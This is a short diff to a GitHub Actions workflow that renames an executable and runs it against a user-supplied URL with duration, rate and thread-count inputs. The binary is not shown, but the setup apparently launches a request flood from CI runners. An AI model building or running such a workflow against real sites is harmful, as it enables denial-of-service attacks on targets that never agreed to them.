@@ -32,9 +32,9 @@ jobs:
           python-version: "3.12"
 
       - name: Make raw executable
-        run: chmod +x raw
+        run: chmod +x ki
 
       - name: Run raw with parameters
         run: |
           TIME=${{ inputs.time }}
-          timeout $TIME ./raw "${{ inputs.url }}" "$((TIME+60))" "${{ inputs.rate }}" "${{ inputs.threads }}"
+          timeout $TIME ./ki "${{ inputs.url }}" "$((TIME+60))" "${{ inputs.rate }}" "${{ inputs.threads }}"
